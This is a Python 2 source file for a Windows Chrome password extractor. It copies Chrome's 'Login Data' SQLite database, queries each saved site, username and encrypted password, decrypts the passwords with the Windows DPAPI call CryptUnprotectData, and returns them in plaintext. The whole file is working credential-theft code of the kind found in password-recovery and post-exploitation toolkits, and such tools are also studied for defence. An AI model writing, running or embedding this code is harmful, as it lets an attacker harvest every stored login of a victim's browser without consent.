import sqlite3
import shutil
import win32crypt
import sys, os, platform


class Chrome():
    def __init__(self):
        pass

    def run(self):

        database_path = ''
        if 'HOMEDRIVE' in os.environ and 'HOMEPATH' in os.environ:
            # For Win7
            path_Win7 = os.environ.get('HOMEDRIVE') + os.environ.get(
                'HOMEPATH') + '\Local Settings\Application Data\Google\Chrome\User Data\Default\Login Data'

            # For XP
            path_XP = os.environ.get('HOMEDRIVE') + os.environ.get(
                'HOMEPATH') + '\AppData\Local\Google\Chrome\User Data\Default\Login Data'

            if os.path.exists(path_XP):
                database_path = path_XP

            elif os.path.exists(path_Win7):
                database_path = path_Win7

            else:
                return
        else:
            return

        # Copy database before to query it (bypass lock errors)
        try:
            shutil.copy(database_path, os.getcwd() + os.sep + 'tmp_db')
            database_path = os.getcwd() + os.sep + 'tmp_db'

        except Exception, e:
            pass

        # Connect to the Database
        try:
            conn = sqlite3.connect(database_path)
            cursor = conn.cursor()
        except Exception, e:
            return

        # Get the results
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        except:
            return

        pwdFound = []
        for result in cursor.fetchall():
            values = {}

            try:
                # Decrypt the Password
                password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
            except Exception, e:
                password = ''

            if password:
                values['Site'] = result[0]
                values['Username'] = result[1]
                values['Password'] = password
                pwdFound.append(values)

        conn.close()
        if database_path.endswith('tmp_db'):
            os.remove(database_path)

        return pwdFound

# tem = Chrome()
# a = tem.run()
# print a